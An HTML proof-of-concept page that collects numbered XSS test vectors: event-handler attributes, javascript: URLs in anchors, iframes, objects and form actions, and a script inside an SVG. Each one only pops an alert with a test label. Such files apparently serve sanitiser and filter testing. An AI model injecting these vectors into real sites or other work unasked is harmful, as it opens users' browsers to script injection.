<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POC</title>
</head>
<body>
    <div>
        <p onclick="alert('XSS Test 1')">Click me to test script injection</p>
    </div>
    <div>
        <a href="javascript:alert('XSS Test 3')">Click me to test anchor XSS</a>
    </div>
    <div>
        <input type="text" value="XSS Test 4" onfocus="alert('XSS Test 4')" />
    </div>
    <div>
        <button onclick="alert('XSS Test 5')">Click me to test button XSS</button>
    </div>
    <div>
        <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
            <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
            <script type="text/javascript">
                alert('XSS Test 6');
            </script>
        </svg>
    </div>
    <div>
        <p style="background-image: url('invalid.jpg');" onerror="alert('XSS Test 7')">Hover over me to test style XSS</p>
    </div>
    <div>
        <iframe src="javascript:alert('XSS Test 8');"></iframe>
    </div>
    <div>
        <object data="javascript:alert('XSS Test 9');"></object>
    </div>
    <div>
        <form action="javascript:alert('XSS Test 10');">
            <input type="submit" value="Submit to test form action XSS">
        </form>
    </div>
</body>
</html>
